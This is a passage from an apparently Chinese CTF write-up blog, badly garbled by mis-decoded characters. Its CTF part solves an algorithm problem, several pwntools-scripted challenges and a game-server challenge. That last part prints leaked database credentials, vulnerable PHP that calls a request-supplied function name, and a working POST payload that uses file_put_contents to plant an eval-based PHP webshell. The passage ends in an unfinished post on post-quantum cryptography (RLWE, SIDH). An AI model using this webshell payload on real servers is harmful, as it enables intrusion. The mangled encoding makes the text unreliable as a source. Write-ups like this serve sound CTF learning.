¼å¼ä¸º $AH$ï¼Œå…¶ä¸­ - $A$ ä¸ºè¯¥ Smith çš„æ”»å‡»å€¼ ($1 \\le A \\le 1000$)ã€‚ - $H$ ä¸ºè¯¥ Smith çš„ç”Ÿå‘½å€¼ ($1 \\le H \\le 1000$)ã€‚ Output è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€éœ€è¦çš„æœ€å°æ”»å‡»å€¼ã€‚å¦‚æœæ— æ³•ä¿è¯å‡»è´¥ Smith ä»¬åˆ™è¾“å‡º -1ã€‚ Hint Neo å’Œ Smith ä»¬æ˜¯ å®æ—¶æˆ˜æ–—åˆ¶ï¼ˆéå›åˆåˆ¶ï¼‰ï¼Œå³ Neo å’Œ Smith ä»¬å¯ä»¥åŒæ—¶æ”»å‡»å¯¹æ–¹ï¼Œåªä¸è¿‡ Neo ä¸€ä¸ªæ—¶é—´åªèƒ½æ‰“ä¸€ä¸ª Smithï¼Œ è€Œ Smith ä»¬å¯ä»¥ç¾¤æ®´ Neoï¼ˆä¸ç”¨è€ƒè™‘ç¢°æ’ä½“ç§¯çš„é—®é¢˜ï¼‰ã€‚ å¯ä»¥å‡å®š Neo å’Œ Smith ä»¬æ¯å•ä½æ—¶é—´åªèƒ½å‡»æ‰“å¯¹æ‰‹ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ª Smith ç”Ÿå‘½å€¼ä¸º 20ï¼Œè€Œ Neo æ”»å‡»å€¼ä¸º 15ï¼Œé‚£ Neo ä¹Ÿéœ€è¦æ¶ˆè€— ä¸¤ä¸ªå•ä½çš„æ—¶é—´æ¥æ¶ˆç­è¯¥ Smithï¼ŒåŒæ—¶æ„å‘³ç€æœ‰ 10 å•ä½çš„æ”»å‡»åŠ›è¢«æµªè´¹æ‰äº†ã€‚ Smith ä¸€æ—¦å—åˆ° Neo çš„æ”»å‡»ï¼Œå°±ä¼šåœæ­¢å‡»æ‰“ Neoã€‚ä¾‹å¦‚ Neo å’Œ Smith æŸä¸€ä¸ªæ—¶åˆ»åŒæ—¶æ”»å‡»å¯¹æ–¹ï¼ŒNeo åˆ™ä¸ä¼šå—åˆ°ä¼¤å®³ã€‚ è´ªå¿ƒç®—æ³•+äºŒåˆ†æŸ¥æ‰¾æœ€å°æ”»å‡»å€¼ã€‚ 12345678910111213141516171819202122232425262728293031from functools import cmp_to_keydef custom_sort(x, y): return y[0] * x[2] - x[0] * y[2]def find_min_attack(neo_life, smiths): l = 1 r = 1000 ans = -1 while l &lt;= r: m = (l + r) // 2 s = [(k[0], k[1], (k[1]+m-1)//m) for k in smiths] s.sort(key=cmp_to_key(custom_sort)) res = 0 t = 0 for i in range(len(s)): res += t*s[i][0] t += s[i][2] if res &lt; neo_life: ans = m r = m - 1 else: l = m + 1 return ansN, H = list(map(int,input().split()))smiths = []for i in range(N): smiths.append(tuple(map(int,input().split()))) print(find_min_attack(H, smiths)) â€‹ gamingæ¸¸æˆæ¥å’¯ç™»å½•æ¸¸æˆå°±åœ¨å…¬å‘Šæ çœ‹åˆ°flagï¼šflag&#123;churusanguo&#125;ã€‚ â€‹ æ”»åŸæ‹”å¯¨è¾¾åˆ°ä¸€å®šç­‰çº§åæ¸¸æˆå†…ä¼šæ”¶åˆ°é‚®ä»¶ï¼ŒæŒ‰ getshell ä¸€é¢˜æ‹¿åˆ°æƒé™åï¼Œæ‰¾åˆ° D:/APMServ5.2.6/www/htdocs/server/config/db.phpï¼Œå¾—åˆ°mysqlæ•°æ®åº“è´¦å·å¯†ç ï¼š 1234567define(&#x27;db_persistent&#x27;,1);define(&#x27;db_RDBMS&#x27;, &#x27;mysql&#x27;);define(&#x27;db_Username&#x27;, &#x27;sgphp1g2ame&#x27;);define(&#x27;db_Password&#x27;, &#x27;@Qwer123456&#x27;);define(&#x27;db_Server&#x27;, &#x27;127.0.0.1&#x27;);define(&#x27;db_Port&#x27;, &#x27;3306&#x27;);define(&#x27;db_Database&#x27;, &#x27;bloodwar&#x27;); åœ¨èšå‰‘ç”¨mysqlè¿æ¥ï¼Œè´¦å· sgphp1g2ameï¼Œå¯†ç  @Qwer123456ï¼Œåœ¨è¡¨ sys_mail_sys_content ä¸­æ‰¾åˆ°é‚®ä»¶å†…å®¹ï¼šæ­å–œæ­å–œ, flag2 flag&#123;jiaguanjinjueN&#125;ã€‚ â€‹ ç‰¹æ®Šç©å®¶æœ‰ç©å®¶çš„åå­—æ˜¯flagï¼ŒæŒ‰ getshell ä¸€é¢˜æ‹¿åˆ°æƒé™åï¼Œæºç è‡ªå¸¦ä¿®æ”¹å™¨ï¼Œæ‰“å¼€å‰ä¿®æ”¹é…ç½®æ–‡ä»¶ config.iniï¼š 123456789[config]IP=120.55.42.64æ•°æ®åº“=bloodwarè´¦å·=sgphp1g2ameå¯†ç =@Qwer123456ç«¯å£=3306è·¯å¾„=D:\\APMServ5.2.6\\www\\htdocs\\images\\armorèŠå¤©ç«¯å£=5308ç™»å½•ä¿¡æ¯= æ‰“å¼€ä¿®æ”¹å™¨ï¼Œåœ¨ç”¨æˆ·åŸºæœ¬ä¿¡æ¯å‘ç°ç”¨æˆ·å flag&#123;mysqlwo&#125;ã€‚ â€‹ getshellåœ¨æºç  APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php ä¸­å‘ç°å®¹æ˜“æ§åˆ¶ä¼ å€¼çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php require_once(&quot;interface.php&quot;); require_once(&quot;utils.php&quot;); require_once(&quot;BattleFunc.php&quot;); require_once(&quot;HeroFunc.php&quot;); require_once(&quot;BattleNetServices.php&quot;); define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;); if (!defined(&#x27;PATH_SEPARATOR&#x27;)) &#123;if (substr(PHP_OS, 0, 3) == &#x27;WIN&#x27;) define(&#x27;PATH_SEPARATOR&#x27;, &#x27;;&#x27;); else define(&#x27;PATH_SEPARATOR&#x27;, &#x27;:&#x27;);&#125; ini_set(&#x27;include_path&#x27;,ini_get(&#x27;include_path&#x27;).PATH_SEPARATOR.realpath(&quot;../&quot;)); $param=$_POST; if(empty($param))$param=$_GET; $from_uid=$param[&quot;from_uid&quot;]; $sign=$param[&quot;sign&quot;]; $commandFunc=$param[&quot;commandFunc&quot;]; $content=urldecode($param[&quot;content&quot;]); $content_encoding=$param[&quot;content-encoding&quot;]; //$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY; $ret=array(); if($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) //signä¸ºä¼ å…¥å€¼ä¸keyè¿æ¥å­—ç¬¦ä¸²çš„md5å€¼ $ret[]=0; else&#123; $ret[]=1; try&#123; if($content_encoding==&quot;csv&quot;)&#123; $inputParams=explode(&quot;|&quot;,$content); //æŒ‰|åˆ†å‰²contentä¼ å…¥å†…å®¹ if(count($inputParams)==1)&#123; $inputParams=$inputParams[0]; &#125; $ret[]=$commandFunc($from_uid,$inputParams); //RCEæ¼æ´ &#125;else&#123; $inputParams=json_decode($content,true); if(is_array($inputParams)&amp;&amp;count($inputParams)==1)&#123; $inputParams=array_shift($inputParams); &#125; $ret[]=$commandFunc($from_uid,$inputParams); &#125; &#125;catch(Exception $e)&#123; $ret = array(0=&gt;0); $ret[] = $e-&gt;getMessage(); &#125; &#125; if($content_encoding==&quot;csv&quot;)&#123; print implode(&quot;|&quot;,$ret); &#125;else&#123; print json_encode($ret); &#125; ?&gt; æ­¤å¤„å¯ä»¥RCEï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œåˆ©ç”¨ file_put_contents å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š POST: from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b èšå‰‘è¿æ¥ï¼Œåœ¨D:ç›®å½•ä¸‹æ‰¾åˆ° flag.txtï¼Œflagï¼šflag&#123;breakItAndOutIt&#125;ã€‚ â€‹ otheræ–‡å­—é¢‘ç‡åˆ†æéé¢„æœŸè§£æ³•ï¼Œå°†1000Ã—1000å›¾ç‰‡åˆ†å‰²ä¸º400å¼ 50Ã—50çš„å›¾ç‰‡ï¼š 1234567891011from PIL import Imagefrom hashlib import md5im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(f&#x27;img/&#123;c&#125;.png&#x27;) c += 1 æµ‹è¯•å‘ç°ç›¸åŒå­—æ¯çš„å›¾ç‰‡ï¼Œå…¶æ–‡ä»¶md5å€¼ç›¸åŒï¼Œåˆ©ç”¨æ­¤è§„å¾‹ç»Ÿè®¡å­—é¢‘ï¼Œå…ˆæ“ä½œä¸€æ¬¡æ‰¾å‡º26ä¸ªå­—æ¯å¯¹åº”æ–‡ä»¶çš„md5å€¼ï¼š 1234567891011121314151617181920from hashlib import md5from collections import Countersample = [7,38,28,0,73,13,42,18,36,102,12,3,2,19, 9,58,20,1,5,30,50,24,11,22,8,66]m = []for i in range(400): path = fr&#x27;C:\\Users\\admin\\Desktop\\img\\&#123;i&#125;.png&#x27; m.append(md5(open(path,&#x27;rb&#x27;).read()).hexdigest())res = Counter(m)print(res)print(len(res))alp_md5 = [m[sample[i]] for i in range(26)]print(alp_md5)# å¾—åˆ°md5å¯¹åº”list# [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;] å†ç»¼åˆèµ·æ¥è§£é¢˜ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imagefrom collections import Counterr = remote(&quot;47.97.127.1&quot;,20382)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()open(&#x27;word.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip()))im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(&#x27;img/&#123;&#125;.png&#x27;.format(c)) c += 1 sample = [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]m = []for i in range(400): path = &#x27;img/&#123;&#125;.png&#x27;.format(i) x = md5(open(path,&#x27;rb&#x27;).read()).hexdigest() m.append(x)res = Counter(m)print(res)print(len(res))out = []for i in range(26): out.append(res[sample[i]])print(out)r.recvuntil(&#x27;&gt; &#x27;)r.sendline(str(out).replace(&#x27; &#x27;,&#x27;&#x27;).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;))r.interactive() å¾—åˆ°ç»“æœï¼š 12Got it!flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125; â€‹ å›¾ç‰‡è¯†åˆ«ç»™å®šåŠ¨ç‰©æ ·æœ¬æ•°æ®ï¼Œåˆ¤æ–­éšæœºæŠ½å–10æ¬¡åŠ¨ç‰©å›¾ç‰‡ï¼Œè¾“å…¥åŠ¨ç‰©åç§°ï¼Œæ­£ç¡®è‡³å°‘8æ¬¡ç»™flagï¼Œæ¯æ¬¡3så†…è¾“å…¥ã€‚ æ•°é‡è¾ƒå°‘ï¼Œéé¢„æœŸç›´æ¥æŒ‰ç…§å›¾ç‰‡æ‰‹åŠ¨åˆ¤æ–­åœ¨3så†…å¿«é€Ÿè¾“å…¥å³å¯ã€‚ åŠè‡ªåŠ¨äº¤äº’ï¼š 1234567891011121314151617181920212223242526272829303132from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imager = remote(&quot;47.97.127.1&quot;,28452)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()r.recvline()for i in range(10): open(&#x27;animal.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip())) img = Image.open(&#x27;animal.png&#x27;) img.show() r.recvuntil(&#x27;&gt; &#x27;) r.sendline(raw_input(&#x27;&gt; &#x27;)) print(r.recvline())r.interactive() â€‹ åƒåœ¾é‚®ä»¶åˆ†ææä¾›50å°é‚®ä»¶å†…å®¹çš„æ­£å¸¸é‚®ä»¶/åƒåœ¾é‚®ä»¶åˆ†ç±»ï¼Œåˆ¤æ–­10å°é‚®ä»¶å†…å®¹å±äºå“ªç§åˆ†ç±»ï¼Œå…¨å¯¹ç»™flagã€‚ æ•°é‡è¾ƒå°‘ï¼Œéé¢„æœŸç›´æ¥æŒ‰ç…§å†…å®¹æ‰‹åŠ¨åˆ¤æ–­å³å¯ã€‚ PoWéƒ¨åˆ†ï¼š 12345678910111213141516171819202122232425from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;47.97.127.1&quot;,27218)table = string.ascii_letters+string.digitsdef pow(): r.recvuntil(&quot;sha256(&quot;) suffix = r.recv(28).decode(&quot;utf8&quot;) r.recvuntil(&quot;= &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((suffix+x).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;xxxx = &#x27;, proof) pow()for i in range(51): print(i) r.recvuntil(&#x27;Press ENTER to continue... &#x27;) r.sendline() r.interactive() æŒ‰å†…å®¹æ‰‹åŠ¨åˆ¤æ–­è¾“å…¥Hï¼ˆæ­£å¸¸é‚®ä»¶ï¼‰æˆ–Sï¼ˆåƒåœ¾é‚®ä»¶ï¼‰ï¼Œå¾—åˆ°ç»“æœï¼š 12Good job! Just take it:flag&#123;da238e5ee5716136c6884c0b4a369093&#125; â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"åé‡å­å¯†ç ","slug":"crypto-åé‡å­å¯†ç ","date":"2022-12-16T14:04:27.000Z","updated":"2023-08-04T16:33:18.963Z","comments":true,"path":"2022/12/16/crypto-åé‡å­å¯†ç /","permalink":"https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/","excerpt":"","text":"â€‹ åé‡å­å¯†ç å­¦ï¼ˆPost-Quantum Cryptographyï¼ŒPQCï¼‰ï¼Œåˆç§°æŠ—é‡å­è®¡ç®—å¯†ç å­¦ï¼Œæ˜¯å¯†ç å­¦çš„ä¸€ä¸ªç ”ç©¶é¢†åŸŸï¼Œä¸“é—¨ç ”ç©¶èƒ½å¤ŸæŠµæŠ—é‡å­è®¡ç®—æœºçš„åŠ å¯†ç®—æ³•ï¼Œç‰¹åˆ«æ˜¯å…¬é’¥åŠ å¯†ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰ç®—æ³•ã€‚ä¸åŒäºé‡å­å¯†ç å­¦ï¼Œåé‡å­å¯†ç å­¦ä½¿ç”¨ç°æœ‰çš„ç”µå­è®¡ç®—æœºï¼Œä¸ä¾é é‡å­åŠ›å­¦ï¼Œå®ƒä¾é çš„æ˜¯å¯†ç å­¦å®¶è®¤ä¸ºæ— æ³•è¢«é‡å­è®¡ç®—æœºæœ‰æ•ˆè§£å†³çš„è®¡ç®—éš¾é¢˜ã€‚ åœ¨å…¬é’¥åŠ å¯†æ–¹é¢ï¼Œåé‡å­å¯†ç å­¦çš„ç ”ç©¶æ–¹å‘åŒ…æ‹¬äº†æ ¼å¯†ç å­¦ï¼ˆLattice-based Cryptographyï¼‰ã€å®¹é”™å­¦ä¹ é—®é¢˜ï¼ˆLWEï¼‰ã€å¤šå˜é‡å¯†ç å­¦ï¼ˆè‹±è¯­ï¼šMultivariate Cryptographyï¼‰ã€æ•£åˆ—å¯†ç å­¦ï¼ˆè‹±è¯­ï¼šHash-based Cryptographyï¼‰ã€ç¼–ç å¯†ç å­¦ï¼ˆCode-based Cryptographyï¼‰ä¸è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿åŒæºå¯†ç å­¦ï¼ˆSupersingular Isogeny Key Exchangeï¼‰ã€‚å¯†ç å­¦å®¶è®¤ä¸ºï¼ŒåŸºäºè¿™äº›è®¡ç®—éš¾é¢˜æœ‰æœ›æ„å»ºå‡ºä¸å—é‡å­è®¡ç®—æœºçš„å¨èƒçš„å…¬é’¥åŠ å¯†ç³»ç»Ÿï¼Œæ›¿ä»£ç°æœ‰çš„æ–¹æ¡ˆã€‚ â€‹ ç¯LWEï¼ˆRLWEï¼‰ç¯LWEé—®é¢˜æ˜¯LWEé—®é¢˜åœ¨ç¯ä¸Šçš„ç‰ˆæœ¬ï¼Œä¸åŒçš„æ˜¯ $A$ å’Œ $s$ çš„é€‰å–æ˜¯åœ¨å¤šé¡¹å¼ç¯ã€‚ å¤šé¡¹å¼ç¯ $R_q = \\mathbb{Z_q}[x]/f(x)$ï¼Œè¡¨ç¤ºæ¯æ¬¡è®¡ç®—åéƒ½è¦å¯¹å¤šé¡¹å¼ç³»æ•°æ¨¡ $q$ï¼Œå¯¹å¤šé¡¹å¼æ¨¡ $f(x)$ã€‚å®ƒå…¶ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå¤šé¡¹å¼ï¼Œæ¯ä¸€æ¬¡æ“ä½œéƒ½ç›¸å½“äºå¯¹å¤šä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œä¹Ÿå°±æ˜¯èƒ½å¤Ÿä¸€æ¬¡åŠ å¯†å¤šä¸ªæ¯”ç‰¹çš„æ˜æ–‡ï¼Œå¯¹æ¯”LWEæ¯æ¬¡ä»…èƒ½å¯¹ä¸€ä¸ªæ¯”ç‰¹æ“ä½œæ¥è¯´èƒ½å¤Ÿå¤§å¤§æé«˜æ•ˆç‡æ»¡è¶³å®é™…éœ€è¦ã€‚ â€‹ è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSIDHï¼‰è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿åŒæºå¯†ç å­¦ï¼ˆSupersingular Elliptic Curve Isogeny Cryptographyï¼‰æ˜¯åˆ©ç”¨è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ï¼ˆSupersingular Elliptic Curvesï¼‰ä¸è¶…å¥‡å¼‚åŒæºå›¾ï¼ˆSupersingular Isogeny Graphsï¼‰çš„æ•°å­¦æ€§è´¨çš„å¯†ç å­¦ï¼Œå¯ä»¥å®ç°è¶…å¥‡å¼‚åŒæºå¯†é’¥äº¤æ¢ï¼ˆSupersingular Isogeny Key Exchangeï¼ŒSIKEï¼‰ï¼ˆåè®®ä¸ºè¶…å¥‡å¼‚åŒæºDiffie-Hellmanå¯†é’¥äº¤æ¢åè®®ï¼ŒSIDHï¼‰ï¼Œå…·æœ‰å‰å‘å®‰å…¨æ€§ã€‚å…¶ä½¿ç”¨æ–¹æ³•å’Œç°æœ‰çš„Diffie-Hellmanå¯†é’¥äº¤æ¢ç›¸ä¼¼ï¼Œæœ‰æœ›ç›´æ¥æ›¿ä»£å½“å‰çš„å¸¸è§„æ¤­åœ†æ›²çº¿å¯†é’¥äº¤æ¢ï¼ˆECDHï¼‰ã€‚ Diffie-HellmanåŸºæœ¬åè®®ï¼š æŠ½è±¡Diffie-Hellmanï¼š Aliceçš„ç§˜å¯†æ˜¯ $a$ï¼Œå¥¹çš„è®¡ç®—å…ˆåšâ†’ï¼Œå¾—åˆ° $g^a$ï¼Œå†åšâ†“ï¼Œå¾—åˆ° $g^{ab}$ã€‚è€ŒBobçš„ç§˜å¯†æ˜¯ $b$ï¼Œä»–å…ˆåšâ†“ï¼Œå†åšâ†’ã€‚æ®Šé€”åŒå½’å¾—åˆ° $g^{ab}$ã€‚ SIDHæ„é€ çš„ç®€åŒ–ç‰ˆæœ¬SIDHçš„åŸºæœ¬ä»£æ•°ç»“æ„æ˜¯è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ç¾¤ $E$ å’Œè¶…å¥‡å¼‚åŒæºï¼ˆIsogenyï¼‰$\\phi$ã€‚åŸºæœ¬æ€è·¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é¦–å…ˆï¼Œè¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ç¾¤ $E$ ç†è§£ä¸ºä¸€ä¸ªç¾¤ã€‚å…¶æ¬¡ï¼Œæ„é€ ç”¨åˆ°çš„è¶…å¥‡å¼‚åŒæº $\\phi : E \\mapsto Eâ€™$ æ˜¯ä»ç¾¤ $E$ åˆ°ç¾¤ $Eâ€™$ çš„ä¸€ç§ç¾¤åŒæ€ã€‚ç®—æ³•ç±»ä¼¼DHç®—æ³•åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š é¦–å…ˆï¼ŒAliceé€‰å–ä¸€ä¸ªç‚¹ $R_A \\in E$ï¼Œ$\\langle R_A \\rangle$ ç¡®å®šäº†ç¾¤ $E$ çš„ä¸€ä¸ªå­ç¾¤ï¼Œç„¶åå¯ä»¥è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_A$ çš„åŒæº $\\phi_A: E \\mapsto E_A$ï¼Œè¿™æ˜¯Aliceçš„ç§˜å¯†ä¿¡æ¯ã€‚Aliceå‘é€å…¬å¼€ä¿¡æ¯ $E_A$ ç»™Bobã€‚ åŒæ ·ï¼ŒBobé€‰æ‹©ç‚¹ $R_B\\in E$ï¼Œç„¶åè®¡ç®—å¾—åˆ° $\\phi_B: E \\mapsto E_B$ï¼ŒæŠŠå…¬å¼€ä¿¡æ¯ $E_B$ å‘é€ç»™Aliceã€‚ æœ€ç»ˆAliceç®—å‡º $E/\\langle R_B, R_A \\rangle$ï¼ŒBobç®—å‡º $E/\\langle R_A, R_B \\rangle$ã€‚ä¸Šå›¾ä¸­çš„ $E/\\langle R_A \\rangle$ å’Œ $E/\\langle R_B \\rangle$ åˆ†åˆ«æ˜¯ $E_A$ å’Œ $E_B$ï¼Œè¿™æ ·è¡¨è¾¾æ˜¯ä¸ºäº†ä¸ä¹‹å‰çš„è¡¨è¾¾ä¸€è‡´ï¼Œå…¶å®è¿™é‡Œå¹¶ä¸æ˜¯åšå•†ç¾¤ï¼Œè€Œæ˜¯è¡¨è¾¾è¯´ $\\phi_A$ çš„Kernelæ˜¯ $\\langle R_A \\rangle$ã€‚ç›®å‰çš„ç§‘æŠ€æ–‡çŒ®å¤§å¤šä½¿ç”¨è¿™ç§è¡¨è¾¾ã€‚ ä¸Šé¢è¯´åˆ°ï¼Œ$E_A$ æ˜¯æ›²çº¿ç¾¤ $E$ çš„å­ç¾¤ï¼Œå®ƒç”±åŒæº $\\phi_A$ å†³å®šï¼Œå¯ç†è§£ä¸ºç¾¤åŒæ€ $\\phi_A$ æ˜ å°„åˆ° $E$ ä¸Šçš„åƒ (Image)å½¢æˆçš„å­ç¾¤ã€‚åŒç†ï¼Œ$E_{BA}$ æ˜¯åŒæº $\\phi_{BA}$ æ˜ å°„åˆ° $E$ ä¸Šçš„å­ç¾¤ï¼Œè€ŒåŒæº $\\phi_{BA}$ æ˜¯ç”± $\\langle R_B, R_A \\rangle$ å†³å®šçš„ï¼Œå³åŒæº $\\phi_{BA}$ çš„Kernelæ˜¯ $\\langle R_B, R_A \\rangle$ã€‚ SIDHæ„é€ çš„ç»†åŒ–ç‰ˆæœ¬ ä¸ºäº†æ»¡è¶³Aliceåœ¨æ²¡æœ‰Bobçš„ç§˜å¯†ä¿¡æ¯çš„æƒ…å†µä¸‹èƒ½è®¡ç®—å‡º $E_{BA}$ çš„è¦æ±‚ï¼ŒSIDHéœ€è¦ä½¿ç”¨æ›´å¤šçš„å‚æ•°è®¾è®¡å’Œç›¸å…³è®¡ç®—ã€‚ç®—æ³•å¢åŠ æè¿°å¦‚ä¸‹ï¼š SIDHå‚æ•°è®¾è®¡é¦–å…ˆï¼Œé€‰æ‹©è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿ $E$ ä½œä¸ºå…¬å¼€å‚æ•°ã€‚ç„¶åAliceéšæœºé€‰æ‹©ä¸¤ä¸ªå…ƒç´  $P_A, Q_A \\in E$ï¼Œå¹¶å…¬å¼€ä½œä¸ºè‡ªå·±çš„å…¬å…±å‚æ•°ã€‚åŒæ ·ï¼ŒBobä¹Ÿéšæœºé€‰æ‹©ä¸¤ä¸ªå…ƒç´  $P_B, Q_B \\in E$ å¹¶å…¬å¼€ã€‚ Aliceçš„æ“ä½œ éšæœºé€‰æ‹©ä¸¤ä¸ªæ•´æ•° $s_A$ å’Œ $t_A$ ä½œä¸ºç§˜å¯†ä¿¡æ¯ï¼Œè®¡ç®— $R_A = s_A P_A + t_A Q_A\\in E$ï¼Œå¹¶ç”± $R_A$ è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_A$ çš„åŒæº $\\phi_A: E \\mapsto E_A$ï¼Œè¿™ä¹Ÿæ˜¯Aliceçš„ç§˜å¯†ä¿¡æ¯ï¼› è·å–Bobçš„å…¬å¼€ä¿¡æ¯ï¼Œå¹¶è®¡ç®— $\\phi_A(P_B)$ å’Œ $\\phi_A(Q_B)$ï¼Œè¿™äº›æ˜¯å…¬å¼€ä¿¡æ¯ï¼› Aliceå‘é€å…¬å¼€ä¿¡æ¯ $E_A$ã€$\\phi_A(P_B)$ å’Œ $\\phi_A(Q_B)$ ç»™Bobã€‚ Bobçš„æ“ä½œ 